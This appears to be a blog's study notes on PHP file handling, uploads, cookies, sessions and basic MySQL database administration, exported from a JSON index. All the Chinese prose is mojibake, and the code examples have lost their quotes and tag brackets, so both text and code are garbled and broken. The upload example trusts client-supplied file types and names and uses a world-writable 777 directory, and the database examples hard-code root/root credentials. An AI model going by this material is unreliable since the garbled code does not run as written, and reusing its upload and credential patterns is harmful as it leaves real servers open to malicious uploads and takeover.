charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headbodyh1æ¬¢è¿æ¥åˆ°æˆ‘çš„ä¸»é¡µ!/h1?php include vars.php;echo I have a $color $car; // I have a red BMW?/body/html PHP æ–‡ä»¶å¤„ç† æ‰“å¼€æ–‡ä»¶ fopen() å‡½æ•°ç”¨äºåœ¨ PHP ä¸­æ‰“å¼€æ–‡ä»¶ ?php$file=fopen(welcome.txt,r);? æ­¤å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å«æœ‰è¦æ‰“å¼€çš„æ–‡ä»¶çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°è§„å®šäº†ä½¿ç”¨å“ªç§æ¨¡å¼æ¥æ‰“å¼€æ–‡ä»¶ æ¨¡å¼ æè¿° r åªè¯»ã€‚åœ¨æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ã€‚ r+ è¯»/å†™ã€‚åœ¨æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ã€‚ w åªå†™ã€‚æ‰“å¼€å¹¶æ¸…ç©ºæ–‡ä»¶çš„å†…å®¹ï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ w+ è¯»/å†™ã€‚æ‰“å¼€å¹¶æ¸…ç©ºæ–‡ä»¶çš„å†…å®¹ï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ a è¿½åŠ ã€‚æ‰“å¼€å¹¶å‘æ–‡ä»¶æœ«å°¾è¿›è¡Œå†™æ“ä½œï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ a+ è¯»/è¿½åŠ ã€‚é€šè¿‡å‘æ–‡ä»¶æœ«å°¾å†™å†…å®¹ï¼Œæ¥ä¿æŒæ–‡ä»¶å†…å®¹ã€‚ x åªå†™ã€‚åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™è¿”å› FALSE å’Œä¸€ä¸ªé”™è¯¯ã€‚ x+ è¯»/å†™ã€‚åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™è¿”å› FALSE å’Œä¸€ä¸ªé”™è¯¯ã€‚ å¦‚æœ fopen() å‡½æ•°æ— æ³•æ‰“å¼€æŒ‡å®šæ–‡ä»¶ï¼Œåˆ™è¿”å› 0 (false)ï¼Œå¯é€šè¿‡ä¸‹ä¾‹ç”Ÿæˆä¸€æ®µæ¶ˆæ¯ ?php$file=fopen(welcome.txt,r) or exit(Unable to open file!);? å…³é—­æ–‡ä»¶ fclose() å‡½æ•°ç”¨äºå…³é—­æ‰“å¼€çš„æ–‡ä»¶ ?php$file = fopen(test.txt,r);//æ‰§è¡Œä¸€äº›ä»£ç fclose($file);? æ£€æµ‹æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰ feof() å‡½æ•°æ£€æµ‹æ˜¯å¦å·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰ if (feof($file)) echo æ–‡ä»¶ç»“å°¾; åœ¨ w ã€a å’Œ x æ¨¡å¼ä¸‹ï¼Œæ— æ³•è¯»å–æ‰“å¼€çš„æ–‡ä»¶ é€è¡Œè¯»å–æ–‡ä»¶ fgets() å‡½æ•°ç”¨äºä»æ–‡ä»¶ä¸­é€è¡Œè¯»å–æ–‡ä»¶ï¼Œåœ¨è°ƒç”¨è¯¥å‡½æ•°ä¹‹åï¼Œæ–‡ä»¶æŒ‡é’ˆä¼šç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œ ?php$file = fopen(welcome.txt, r) or exit(æ— æ³•æ‰“å¼€æ–‡ä»¶!);// è¯»å–æ–‡ä»¶æ¯ä¸€è¡Œï¼Œç›´åˆ°æ–‡ä»¶ç»“å°¾while(!feof($file)) echo fgets($file). br;fclose($file);? é€å­—ç¬¦è¯»å–æ–‡ä»¶ fgetc() å‡½æ•°ç”¨äºä»æ–‡ä»¶ä¸­é€å­—ç¬¦åœ°è¯»å–æ–‡ä»¶ï¼Œåœ¨è°ƒç”¨è¯¥å‡½æ•°ä¹‹åï¼Œæ–‡ä»¶æŒ‡é’ˆä¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ ?php$file=fopen(welcome.txt,r) or exit(æ— æ³•æ‰“å¼€æ–‡ä»¶!);while (!feof($file)) echo fgetc($file);fclose($file);? PHP æ–‡ä»¶ä¸Šä¼  åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å• htmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headbodyform action=upload_file.php method=post enctype=multipart/form-data label for=fileæ–‡ä»¶åï¼š/label input type=file name=file id=filebr input type=submit name=submit value=æäº¤/form/body/html [!IMPORTANT] enctype åœ¨ HTML è¡¨å•ä¸­ï¼Œenctype å±æ€§ç”¨äºæŒ‡å®šè¡¨å•æ•°æ®åœ¨å‘é€åˆ°æœåŠ¡å™¨æ—¶çš„ç¼–ç ç±»å‹ã€‚è¿™ä¸ªå±æ€§ä¸»è¦åœ¨ä½¿ç”¨ POST æ–¹æ³•æ—¶ç”Ÿæ•ˆï¼Œå†³å®šäº†è¡¨å•ä¸­æ•°æ®å¦‚ä½•è¢«æ ¼å¼åŒ–ã€‚ä¸‹é¢æ˜¯å¸¸ç”¨çš„enctypeå€¼ï¼š å€¼ æè¿° application/x-www-form-urlencoded é»˜è®¤å€¼ã€‚è¡¨å•æ•°æ®ä¼šè¢«ç¼–ç ä¸ºé”®å€¼å¯¹ï¼ˆé”®å’Œå€¼é€šè¿‡ = è¿æ¥ï¼Œä¸åŒé”®å€¼å¯¹é€šè¿‡ è¿æ¥ï¼‰ä»¥ URL ç¼–ç çš„å½¢å¼å‘é€åˆ°æœåŠ¡å™¨ã€‚é€‚ç”¨äºæ™®é€šè¡¨å•ï¼ˆæ¯”å¦‚æ–‡æœ¬è¾“å…¥ï¼‰ multipart/form-data ç”¨äºä¸Šä¼ æ–‡ä»¶æ—¶ã€‚æ•°æ®ä¼šä»¥åˆ†æ®µå½¢å¼è¿›è¡Œç¼–ç ï¼Œæ¯æ®µåŒ…å«ä¸€ä¸ªè¡¨å•æ§ä»¶çš„æ•°æ®ã€‚å¿…é¡»åœ¨è¡¨å•ä¸­ä½¿ç”¨ method=post å’Œ enctype=multipart/form-data æ‰èƒ½ä¸Šä¼ æ–‡ä»¶ text/plain è¡¨å•æ•°æ®ä»¥çº¯æ–‡æœ¬å½¢å¼è¿›è¡Œç¼–ç ï¼ˆé”®å€¼å¯¹ä»¥ = è¿æ¥ï¼Œä¸åŒé”®å€¼å¯¹é€šè¿‡æ¢è¡Œç¬¦åˆ†éš”ï¼‰ä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç  input æ ‡ç­¾çš„ type=â€œfileâ€ å±æ€§è§„å®šäº†åº”è¯¥æŠŠè¾“å…¥ä½œä¸ºæ–‡ä»¶æ¥å¤„ç†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“åœ¨æµè§ˆå™¨ä¸­é¢„è§ˆæ—¶ï¼Œä¼šçœ‹åˆ°è¾“å…¥æ¡†æ—è¾¹æœ‰ä¸€ä¸ªæµè§ˆæŒ‰é’®ã€‚ åˆ›å»ºä¸Šä¼ è„šæœ¬ ?phpif ($_FILES[file][error] 0) echo é”™è¯¯ï¼š . $_FILES[file][error] . br;else echo ä¸Šä¼ æ–‡ä»¶å: . $_FILES[file][name] . br; echo æ–‡ä»¶ç±»å‹: . $_FILES[file][type] . br; echo æ–‡ä»¶å¤§å°: . ($_FILES[file][size] / 1024) . kBbr; echo æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: . $_FILES[file][tmp_name];? é€šè¿‡ä½¿ç”¨ PHP çš„å…¨å±€æ•°ç»„ $_FILESï¼Œå¯ä»¥ä»å®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ [!IMPORTANT] $_FILES ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„ input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯ â€œnameâ€ã€â€œtypeâ€ã€â€œsizeâ€ã€â€œtmp_nameâ€ æˆ– â€œerrorâ€ å­—æ®µ è¯´æ˜ ç¤ºä¾‹ $_FILES['file']['name'] ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹åç§°ï¼ˆåŒ…æ‹¬æ‰©å±•åï¼‰ example.jpg $_FILES['file']['type'] ä¸Šä¼ æ–‡ä»¶çš„ MIME ç±»å‹ï¼ˆä¾‹å¦‚ image/jpegï¼Œtext/plainï¼‰ image/jpeg $_FILES['file']['size'] ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ 102400 (100 KB) $_FILES['file']['tmp_name'] æ–‡ä»¶ä¸Šä¼ åå­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶æ–‡ä»¶å /tmp/phpY9k1b9 $_FILES['file']['error'] ä¸Šä¼ è¿‡ç¨‹ä¸­å‘ç”Ÿçš„é”™è¯¯ä»£ç  UPLOAD_ERR_OK (0) å¸¸è§çš„erroré”™è¯¯ä»£ç  é”™è¯¯ä»£ç  è¯´æ˜ é”™è¯¯æ•°å­— UPLOAD_ERR_OK æ–‡ä»¶ä¸Šä¼ æˆåŠŸ 0 UPLOAD_ERR_INI_SIZE ä¸Šä¼ çš„æ–‡ä»¶è¶…è¿‡äº† PHP é…ç½®æ–‡ä»¶ upload_max_filesize çš„é™åˆ¶ 1 UPLOAD_ERR_FORM_SIZE ä¸Šä¼ çš„æ–‡ä»¶è¶…è¿‡äº† HTML è¡¨å•è®¾ç½®çš„ MAX_FILE_SIZE çš„é™åˆ¶ 2 UPLOAD_ERR_PARTIAL æ–‡ä»¶éƒ¨åˆ†ä¸Šä¼ ï¼ˆå¯èƒ½ç”±äºç½‘ç»œä¸­æ–­ç­‰åŸå› ï¼‰ 3 UPLOAD_ERR_NO_FILE æ²¡æœ‰æ–‡ä»¶è¢«ä¸Šä¼  4 UPLOAD_ERR_NO_TMP_DIR PHP ç¼ºå°‘ä¸´æ—¶æ–‡ä»¶å¤¹ 6 UPLOAD_ERR_CANT_WRITE PHP æ— æ³•å†™å…¥æ–‡ä»¶åˆ°ç£ç›˜ 7 UPLOAD_ERR_EXTENSION ä¸Šä¼ è¢« PHP æ‰©å±•ç¨‹åºé˜»æ­¢ 8 ä¸Šä¼ é™åˆ¶ é™åˆ¶æ–‡ä»¶ä¸Šä¼ çš„æ ¼å¼ï¼ˆå¦‚.gifã€.pngï¼‰åŠä¸Šä¼ æ–‡ä»¶çš„å¤§å° ä¿å­˜è¢«ä¸Šä¼ çš„æ–‡ä»¶ ?php// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€$allowedExts = array(gif, jpeg, jpg, png);$temp = explode(., $_FILES[file][name]);echo $_FILES[file][size];$extension = end($temp); // è·å–æ–‡ä»¶åç¼€åif ((($_FILES[file][type] == image/gif)|| ($_FILES[file][type] == image/jpeg)|| ($_FILES[file][type] == image/jpg)|| ($_FILES[file][type] == image/pjpeg)|| ($_FILES[file][type] == image/x-png)|| ($_FILES[file][type] == image/png)) ($_FILES[file][size] 204800) // å°äº 200 kb in_array($extension, $allowedExts)) if ($_FILES[file][error] 0) echo é”™è¯¯ï¼š: . $_FILES[file][error] . br; else echo ä¸Šä¼ æ–‡ä»¶å: . $_FILES[file][name] . br; echo æ–‡ä»¶ç±»å‹: . $_FILES[file][type] . br; echo æ–‡ä»¶å¤§å°: . ($_FILES[file][size] / 1024) . kBbr; echo æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: . $_FILES[file][tmp_name] . br; // åˆ¤æ–­å½“å‰ç›®å½•ä¸‹çš„ upload ç›®å½•æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ // å¦‚æœæ²¡æœ‰ upload ç›®å½•ï¼Œä½ éœ€è¦åˆ›å»ºå®ƒï¼Œupload ç›®å½•æƒé™ä¸º 777 if (file_exists(upload/ . $_FILES[file][name])) echo $_FILES[file][name] . æ–‡ä»¶å·²ç»å­˜åœ¨ã€‚ ; else // å¦‚æœ upload ç›®å½•ä¸å­˜åœ¨è¯¥æ–‡ä»¶åˆ™å°†æ–‡ä»¶ä¸Šä¼ åˆ° upload ç›®å½•ä¸‹ move_uploaded_file($_FILES[file][tmp_name], upload/ . $_FILES[file][name]); echo æ–‡ä»¶å­˜å‚¨åœ¨: . upload/ . $_FILES[file][name]; else echo éæ³•çš„æ–‡ä»¶æ ¼å¼;? [!IMPORTANT] in_array($extension, $allowedExts) ç”¨äºæ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„æ‰©å±•ååˆ—è¡¨ä¸­ $extensionï¼Œå³æ–‡ä»¶æ‰©å±•åï¼Œ$allowedExtsï¼Œå³å…è®¸çš„æ‰©å±•ååˆ—è¡¨ PHP Cookie cookie å¸¸ç”¨äºè¯†åˆ«ç”¨æˆ· cookie æ˜¯ä¸€ç§æœåŠ¡å™¨ç•™åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„å°æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œè¿™å°è®¡ç®—æœºå°†ä¼šå‘é€ cookie åˆ›å»ºCookie setcookie() å‡½æ•°ç”¨äºè®¾ç½® cookieï¼Œsetcookie() å‡½æ•°å¿…é¡»ä½äº html æ ‡ç­¾ä¹‹å‰ setcookie(name, value, expire, path, domain); å®ä¾‹ åˆ›å»ºåä¸º â€œuserâ€ çš„ cookieï¼Œå¹¶ä¸ºå®ƒèµ‹å€¼ â€œrunoobâ€ï¼Œè§„å®šäº†æ­¤ cookie åœ¨ä¸€å°æ—¶åè¿‡æœŸ ?phpsetcookie(user, runoob, time()+3600);?html..... [!CAUTION] åœ¨å‘é€ cookie æ—¶ï¼Œcookie çš„å€¼ä¼šè‡ªåŠ¨è¿›è¡Œ URL ç¼–ç ï¼Œåœ¨å–å›æ—¶è¿›è¡Œè‡ªåŠ¨è§£ç ï¼ˆä¸ºé˜²æ­¢ URL ç¼–ç ï¼Œè¯·ä½¿ç”¨ setrawcookie() å–è€Œä»£ä¹‹ï¼‰ [!TIP] å¯ä»¥é€šè¿‡å¦ä¸€ç§æ–¹å¼è®¾ç½® cookie çš„è¿‡æœŸæ—¶é—´ï¼ˆæ¯”ä½¿ç”¨ç§’è¡¨ç¤ºçš„æ–¹æ³•ç®€å•ï¼‰ ?php$expire=time()+60*60*24*30;setcookie(user, runoob, $expire);? åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­ï¼Œè¿‡æœŸæ—¶é—´è¢«è®¾ç½®ä¸ºä¸€ä¸ªæœˆï¼ˆ60 ç§’ * 60 åˆ† * 24 å°æ—¶ * 30 å¤©ï¼‰ å–å›Cookieçš„å€¼ PHP çš„ $_COOKIE å˜é‡ç”¨äºå–å› cookie çš„å€¼ åœ¨ä¸‹é¢çš„å®ä¾‹ä¸­ï¼Œæˆ‘ä»¬å–å›äº†åä¸º â€œuserâ€ çš„ cookie çš„å€¼ï¼Œå¹¶æŠŠå®ƒæ˜¾ç¤ºåœ¨äº†é¡µé¢ä¸Šï¼š ?php// è¾“å‡º cookie å€¼echo $_COOKIE[user];// æŸ¥çœ‹æ‰€æœ‰ cookieprint_r($_COOKIE);? åœ¨ä¸‹é¢çš„å®ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ isset() å‡½æ•°æ¥ç¡®è®¤æ˜¯å¦å·²è®¾ç½®äº† cookieï¼š ?phpif (isset($_COOKIE[user])) echo æ¬¢è¿ . $_COOKIE[user] . !br;else echo æ™®é€šè®¿å®¢!br;? åˆ é™¤Cookie å½“åˆ é™¤ cookie æ—¶ï¼Œåº”å½“ä½¿è¿‡æœŸæ—¥æœŸå˜æ›´ä¸ºè¿‡å»çš„æ—¶é—´ç‚¹ ?php// è®¾ç½® cookie è¿‡æœŸæ—¶é—´ä¸ºè¿‡å» 1 å°æ—¶setcookie(user, , time()-3600);? æµè§ˆå™¨ä¸æ”¯æŒCookie ä¸€ç§è§£å†³æ–¹å¼æ˜¯é€šè¿‡è¡¨å•ä¼ é€’æ•°æ® PHP Session PHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„è®¾ç½®ã€‚Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ ä¸ Cookie ä¸åŒï¼ŒSession çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Š Session çš„å·¥ä½œæœºåˆ¶æ˜¯ï¼šä¸ºæ¯ä¸ªè®¿å®¢åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ id (UID)ï¼Œå¹¶åŸºäºè¿™ä¸ª UID æ¥å­˜å‚¨å˜é‡ã€‚UID å­˜å‚¨åœ¨ cookie ä¸­ï¼Œæˆ–è€…é€šè¿‡ URL è¿›è¡Œä¼ å¯¼ã€‚ å¼€å§‹PHP Session æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° PHP session ä¸­ä¹‹å‰ï¼Œé¦–å…ˆå¿…é¡»å¯åŠ¨ä¼šè¯ã€‚ æ³¨ï¼šsession_start() å‡½æ•°å¿…é¡»ä½äº html æ ‡ç­¾ä¹‹å‰ï¼š ?php session_start(); ? htmlbody /body/html ä¸Šé¢çš„ä»£ç ä¼šå‘æœåŠ¡å™¨æ³¨å†Œç”¨æˆ·çš„ä¼šè¯ï¼Œä»¥ä¾¿å¯ä»¥å¼€å§‹ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒæ—¶ä¼šä¸ºç”¨æˆ·ä¼šè¯åˆ†é…ä¸€ä¸ª UID å­˜å‚¨å’Œè¯»å– Session æ•°æ® ä½¿ç”¨ PHP $_SESSION å˜é‡ ?phpsession_start();// è¯»å– Session æ•°æ®if (isset($_SESSION[username])) echo ç”¨æˆ·å: . $_SESSION[username]; // è¾“å‡º: ç”¨æˆ·å: Alice else echo ç”¨æˆ·åæœªè®¾ç½®ã€‚;? é”€æ¯Session å¯ä»¥ä½¿ç”¨ unset() æˆ– session_destroy() å‡½æ•°åˆ é™¤æŸäº› session æ•°æ® unset() åˆ é™¤ $_SESSION é‡Œçš„æŒ‡å®šæ•°æ® ?phpsession_start();if(isset($_SESSION[views])) unset($_SESSION[views]);? session_unset() æ¸…ç©ºæ‰€æœ‰ä¼šè¯æ•°æ®ä½†ä¿ç•™ä¼šè¯æœ¬èº«ï¼ˆå³ä¸ä¼šåˆ é™¤ Session ID æˆ–ç»ˆæ­¢ä¼šè¯ï¼‰ session_destroy() ç»ˆæ­¢ä¼šè¯å¹¶åˆ é™¤æœåŠ¡å™¨ç«¯çš„ä¼šè¯æ•°æ®ï¼ˆå¦‚å­˜å‚¨åœ¨ $_SESSION ä¸­çš„æ‰€æœ‰æ•°æ®ï¼‰ç„¶è€Œï¼Œå®ƒä¸ä¼šç«‹å³æ¸…ç©º $_SESSION æ•°ç»„ä¸­çš„æ•°æ®ï¼Œä¹Ÿä¸ä¼šåˆ é™¤å®¢æˆ·ç«¯çš„ Session ID Cookie ?phpsession_destroy();? [!TIP] å¦‚æœ session_destroy() åè¿˜éœ€è¦åˆ é™¤å®¢æˆ·ç«¯çš„ä¼šè¯ Cookie setcookie(session_name(), , time() - 3600); // åˆ é™¤å®¢æˆ·ç«¯ Cookie ?phpsession_start(); // å¼€å¯ä¼šè¯// æ¸…ç©ºæ‰€æœ‰ Session æ•°æ®session_unset();// é”€æ¯ä¼šè¯session_destroy();// åˆ é™¤å®¢æˆ·ç«¯çš„ Session ID Cookieif (ini_get(session.use_cookies)) $params = session_get_cookie_params(); setcookie(session_name(), , time() - 3600, $params[path], $params[domain], $params[secure], $params[httponly] );echo ä¼šè¯å·²é”€æ¯ï¼Œå®¢æˆ·ç«¯çš„ Session Cookie å·²åˆ é™¤ã€‚;? PHP æ•°æ®åº“","tags":["PHP","OOP"],"categories":["PHP","ç¼–ç¨‹"]},{"title":"MySQL","path":"/2025/07/09/MySQL/","content":"MySQL ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ MySQL æ³¨é‡Š å•è¡Œæ³¨é‡Šï¼ˆ-- å’Œ #ï¼‰ å¤šè¡Œæ³¨é‡Šï¼ˆ/* */ï¼‰ MySQLè¿æ¥ ä½¿ç”¨ MySQL äºŒè¿›åˆ¶æ–¹å¼è¿æ¥ win+R - cmd é€šè¿‡D:åˆ‡æ¢åˆ°Dç›˜ï¼ˆæˆ‘çš„mysqlå®‰è£…åœ¨Dç›˜ï¼‰ mysql -u root -p æŒ‰ç…§æç¤ºè¾“å…¥å¯†ç rootï¼ˆé»˜è®¤ï¼‰ï¼Œå¹¶æŒ‰ä¸‹ Enter é”® åœ¨ç™»å½•æˆåŠŸåä¼šå‡ºç°mysqlå‘½ä»¤æç¤ºçª—å£ï¼Œä½ å¯ä»¥åœ¨ä¸Šé¢æ‰§è¡Œä»»ä½• SQL è¯­å¥ Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2854760 to server version: 5.0.9Type help; or \\h for help. Type \\c to clear the buffer. ä»¥ä¸Šä¸ºç™»å½•æˆåŠŸè¾“å‡ºç»“æœ åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ•°æ®åº“ï¼š SHOW DATABASES; é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼š USE your_database; åˆ—å‡ºæ‰€é€‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š SHOW TABLES; é€€å‡ºmysqlå‘½ä»¤æç¤ºçª—å£ï¼šEXIT æˆ– QUIT ä½¿ç”¨ PHP è„šæœ¬è¿æ¥ mysqli_connect() å‡½æ•°æ¥è¿æ¥æ•°æ®åº“ mysqli_connect(host, username, password, dbname,port, socket); å‚æ•° æè¿° host å¯é€‰ã€‚è§„å®šä¸»æœºåæˆ– IP åœ°å€ã€‚ username å¯é€‰ã€‚è§„å®š MySQL ç”¨æˆ·åã€‚ password å¯é€‰ã€‚è§„å®š MySQL å¯†ç ã€‚ dbname å¯é€‰ã€‚è§„å®šé»˜è®¤ä½¿ç”¨çš„æ•°æ®åº“ã€‚ port å¯é€‰ã€‚è§„å®šå°è¯•è¿æ¥åˆ° MySQL æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ socket å¯é€‰ã€‚è§„å®š socket æˆ–è¦ä½¿ç”¨çš„å·²å‘½å pipeã€‚ mysqli_close() å‡½æ•°æ¥æ–­å¼€ä¸ MySQL æ•°æ®åº“çš„é“¾æ¥ bool mysqli_close ( mysqli $link ) ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(Could not connect: . mysqli_error());echo æ•°æ®åº“è¿æ¥æˆåŠŸï¼;mysqli_close($conn);? MySQL åˆ›å»ºæ•°æ®åº“ ä½¿ç”¨ create å‘½ä»¤ CREATE DATABASE æ•°æ®åº“å; CREATE DATABASE æ•°æ®åº“å CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; [!CAUTION] ä¸Šè¿°ä¾‹å­æŒ‡å®šè¯¥æ•°æ®åº“ä½¿ç”¨çš„å­—ç¬¦é›†ä¸º utf8mb4ï¼Œæ”¯æŒå®Œæ•´çš„ UTF-8 ç¼–ç ï¼ˆåŒ…æ‹¬è¡¨æƒ…ç¬¦å·å’Œå…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼‰å¹¶è®¾ç½®æ’åºè§„åˆ™ä¸º utf8mb4_general_ciï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ ä¸ºäº†é¿å…æ•°æ®åº“å·²ç»å­˜åœ¨ï¼Œæ‰§è¡Œ CREATE DATABASE å°†å¯¼è‡´é”™è¯¯ï¼š CREATE DATABASE IF NOT EXISTS æ•°æ®åº“å; ä½¿ç”¨ mysqladmin mysqladmin -u root -p create æ•°æ®åº“å å¦‚æœè¦åœ¨åˆ›å»ºæ•°æ®åº“æ—¶æŒ‡å®šå­—ç¬¦é›†å’Œæ’åºè§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨ -default-character-setå’Œ -default-collationå‚æ•°ï¼š mysqladmin -u root -p create æ•°æ®åº“å \\ --default-character-set=utf8mb4 \\ --default-collation=utf8mb4_general_ci å¦‚æœå¸Œæœ›ä½¿ç”¨ mysqladmin è¿æ¥åˆ° MySQL æœåŠ¡å™¨æ‰§è¡Œå…¶ä»–ç®¡ç†ä»»åŠ¡ï¼Œä¾‹å¦‚æŸ¥çœ‹æœåŠ¡å™¨çŠ¶æ€ã€é‡å¯æœåŠ¡å™¨ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å½¢å¼çš„å‘½ä»¤ï¼š mysqladmin -u your_username -p your_command//your_commandä¸ºå¸Œæœ›æ‰§è¡Œçš„å…·ä½“ç®¡ç†å‘½ä»¤ ä¾‹å¦‚ï¼Œè¦æŸ¥çœ‹ MySQL æœåŠ¡å™¨çš„çŠ¶æ€ï¼š mysqladmin -u root -p status ä½¿ç”¨ PHPè„šæœ¬ PHP ä½¿ç”¨ mysqli_query å‡½æ•°æ¥åˆ›å»ºæˆ–è€…åˆ é™¤ MySQL æ•°æ®åº“ mysqli_query(connection,query,resultmode); å‚æ•° æè¿° connection å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚ query å¿…éœ€ï¼Œè§„å®šæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ resultmode å¯é€‰ã€‚ä¸€ä¸ªå¸¸é‡ã€‚å¯ä»¥æ˜¯ä¸‹åˆ—å€¼ä¸­çš„ä»»æ„ä¸€ä¸ªï¼šMYSQLI_USE_RESULTï¼ˆå¦‚æœéœ€è¦æ£€ç´¢å¤§é‡æ•°æ®ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªï¼‰MYSQLI_STORE_RESULTï¼ˆé»˜è®¤ï¼‰ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥é”™è¯¯: . mysqli_error($conn));echo è¿æ¥æˆåŠŸbr /;$sql = CREATE DATABASE RUNOOB;$retval = mysqli_query($conn,$sql );if(! $retval ) die(åˆ›å»ºæ•°æ®åº“å¤±è´¥: . mysqli_error($conn));echo æ•°æ®åº“ RUNOOB åˆ›å»ºæˆåŠŸ ;mysqli_close($conn);? MySQL åˆ é™¤æ•°æ®åº“ ä½¿ç”¨drop å‘½ä»¤ DROP DATABASE æ•°æ®åº“å; -- ç›´æ¥åˆ é™¤æ•°æ®åº“ï¼Œä¸æ£€æŸ¥æ˜¯å¦å­˜åœ¨æˆ–DROP DATABASE IF EXISTS æ•°æ®åº“å; ä½¿ç”¨ mysqladmin mysqladmin -u root -p drop æ•°æ®åº“å ä½¿ç”¨ PHP è„šæœ¬ PHPä½¿ç”¨ mysqli_query å‡½æ•°æ¥åˆ›å»ºæˆ–è€…åˆ é™¤ MySQL æ•°æ®åº“ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));echo è¿æ¥æˆåŠŸbr /;$sql = DROP DATABASE RUNOOB;$retval = mysqli_query( $conn, $sql );if(! $retval ) die(åˆ é™¤æ•°æ®åº“å¤±è´¥: . mysqli_error($conn));echo æ•°æ®åº“ RUNOOB åˆ é™¤æˆåŠŸ ;mysqli_close($conn);? MySQL é€‰æ‹©æ•°æ®åº“ ä»å‘½ä»¤æç¤ºçª—å£ä¸­ åœ¨ MySQL ä¸­ USE æ•°æ®åº“å; åœ¨å‘½ä»¤è¡Œä¸­ mysql -u root -p -D æ•°æ®åº“å ä½¿ç”¨ PHP è„šæœ¬ mysqli_select_db(connection,dbname); å‚æ•° æè¿° connection å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚ dbname 